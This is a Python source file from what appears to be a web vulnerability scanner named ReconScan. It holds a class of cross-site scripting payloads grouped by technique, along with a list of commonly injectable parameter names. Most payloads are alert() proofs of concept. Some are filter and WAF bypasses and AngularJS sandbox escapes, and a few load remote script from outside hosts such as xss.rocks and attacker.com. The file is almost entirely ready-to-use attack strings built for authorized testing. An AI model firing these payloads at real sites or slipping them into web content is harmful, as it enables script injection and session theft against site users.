"""
ReconScan XSS Payload Library

Comprehensive XSS testing payloads from exploit databases and security research.
Organized by technique and bypass method for systematic testing.
"""

class XSSPayloads:
    """Comprehensive XSS payload collection for vulnerability testing."""
    
    def __init__(self):
        """Initialize XSS payload sets."""
        
        # Basic script injection payloads
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>"
        ]
        
        # Event handler based payloads (from exploit-db)
        self.event_handler_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<input onmouseover=alert('XSS')>",
            "<div onmouseover=alert('XSS')>test</div>"
        ]
        
        # SVG based payloads
        self.svg_payloads = [
            "<svg onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg onload=alert(1)>",
            "<svg onload=alert(String.fromCharCode(88,83,83))>",
            "<svg/onload=alert('XSS')>",
            "<svg onload=\"alert('XSS')\">",
            "<svg><animatetransform onbegin=alert('XSS')>",
            "<svg><set onbegin=alert('XSS')>",
            "<svg><animate onbegin=alert('XSS')>",
            "<svg><foreignobject><script>alert('XSS')</script></foreignobject>"
        ]
        
        # Filter bypass payloads (common WAF bypasses)
        self.bypass_payloads = [
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<SCR<SCRIPT>IPT>alert('XSS')</SCR</SCRIPT>IPT>",
            "<SCRIPT SRC=//xss.rocks/xss.js></SCRIPT>",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=`javascript:alert('XSS')`>",
            "<IMG \"\"\"><SCRIPT>alert('XSS')</SCRIPT>\">",
            "<IMG SRC=# onmouseover=\"alert('XSS')\">",
            "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>",
            "</script><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//"
        ]
        
        # HTML5 specific payloads
        self.html5_payloads = [
            "<video src=x onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<link rel=import href=javascript:alert('XSS')>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "<form><button formaction=javascript:alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<isindex type=image src=x onerror=alert('XSS')>"
        ]
        
        # Advanced encoding bypasses
        self.encoded_payloads = [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>",
            "<script>(alert)('XSS')</script>",
            "<script>a=alert,a('XSS')</script>",
            "<script>[].constructor.constructor('alert(\"XSS\")')())</script>"
        ]
        
        # AngularJS specific payloads (if AngularJS detected)
        self.angularjs_payloads = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{7*7}}",
            "{{$eval.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].map(toString.constructor,alert,'1')}}",
            "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='a'+(y='alert(1)')+'';\")}}",
            "{{$new.constructor(\"alert(1)\")()}}",
            "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,null,'alert(1)')()}}",
            "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].map(toString.constructor,alert,'1')}}"
        ]
        
        # Context-specific payloads
        self.context_payloads = {
            'attribute': [
                "\" onmouseover=\"alert('XSS')\"",
                "' onmouseover='alert(\"XSS\")'",
                "\" onfocus=\"alert('XSS')\" autofocus=\"",
                "' onfocus='alert(\"XSS\")' autofocus='",
                "\" style=\"background:url(javascript:alert('XSS'))\"",
                "javascript:alert('XSS')"
            ],
            'href': [
                "javascript:alert('XSS')",
                "javascript:alert(String.fromCharCode(88,83,83))",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')",
                "javascript:/**/alert('XSS')"
            ],
            'style': [
                "background:url(javascript:alert('XSS'))",
                "expression(alert('XSS'))",
                "-moz-binding:url(//attacker.com/xss.xml#xss)",
                "behavior:url(//attacker.com/xss.htc)"
            ]
        }
    
    def get_basic_payloads(self):
        """Get basic XSS testing payloads."""
        return self.basic_payloads
    
    def get_event_handler_payloads(self):
        """Get event handler based XSS payloads."""
        return self.event_handler_payloads
    
    def get_svg_payloads(self):
        """Get SVG-based XSS payloads."""
        return self.svg_payloads
    
    def get_bypass_payloads(self):
        """Get filter/WAF bypass payloads."""
        return self.bypass_payloads
    
    def get_html5_payloads(self):
        """Get HTML5 specific payloads."""
        return self.html5_payloads
    
    def get_encoded_payloads(self):
        """Get encoded/obfuscated payloads."""
        return self.encoded_payloads
    
    def get_angularjs_payloads(self):
        """Get AngularJS template injection payloads."""
        return self.angularjs_payloads
    
    def get_context_payloads(self, context='general'):
        """Get context-specific payloads."""
        if context in self.context_payloads:
            return self.context_payloads[context]
        return []
    
    def get_all_payloads(self):
        """Get comprehensive list of all XSS payloads."""
        all_payloads = []
        all_payloads.extend(self.basic_payloads)
        all_payloads.extend(self.event_handler_payloads)
        all_payloads.extend(self.svg_payloads)
        all_payloads.extend(self.bypass_payloads)
        all_payloads.extend(self.html5_payloads)
        all_payloads.extend(self.encoded_payloads)
        all_payloads.extend(self.angularjs_payloads)
        
        # Add context-specific payloads
        for context_payloads in self.context_payloads.values():
            all_payloads.extend(context_payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    def get_targeted_payloads(self, severity='medium'):
        """Get payloads based on severity/depth of testing."""
        if severity == 'low':
            return self.basic_payloads[:5]
        elif severity == 'medium':
            payloads = []
            payloads.extend(self.basic_payloads)
            payloads.extend(self.event_handler_payloads[:10])
            payloads.extend(self.svg_payloads[:5])
            return payloads
        elif severity == 'high':
            return self.get_all_payloads()
        else:
            return self.basic_payloads
    
    @staticmethod
    def get_common_parameters():
        """Get common parameter names for XSS testing."""
        return [
            'q', 'search', 'query', 'name', 'comment', 'message', 'text', 
            'input', 'data', 'value', 'content', 'title', 'description',
            'body', 'post', 'note', 'feedback', 'review', 'subject',
            'keyword', 'term', 'phrase', 'str', 'string', 'html',
            'username', 'email', 'url', 'link', 'address', 'location'
        ] 